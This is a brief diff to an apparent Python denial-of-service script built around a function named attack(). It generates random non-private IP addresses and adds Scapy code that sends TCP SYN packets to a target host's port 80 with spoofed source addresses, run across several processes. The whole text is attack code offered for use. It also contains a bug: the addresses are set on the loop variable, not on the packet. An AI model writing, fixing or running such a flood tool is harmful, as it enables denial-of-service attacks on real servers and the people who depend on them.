@@ -16,7 +16,7 @@ def attack():
     block3 = ''
     block4 = ''
     while True:
-        block1 = str(random.randint(10, 127))
+        block1 = str(random.randint(40, 127))
         if block1 != "10" and block1 != "172" and block1 != "192":
             break
 
@@ -27,6 +27,12 @@ def attack():
 
     for ip in ip_network:
         print(ip.__str__())
+        p = IP()
+        ip.src = ip.__str__()
+        ip.dst = host
+
+        t = TCP(dport=80, flags="S")
+        send(p / t)
 
 
 for i in range(0, no_of_process):
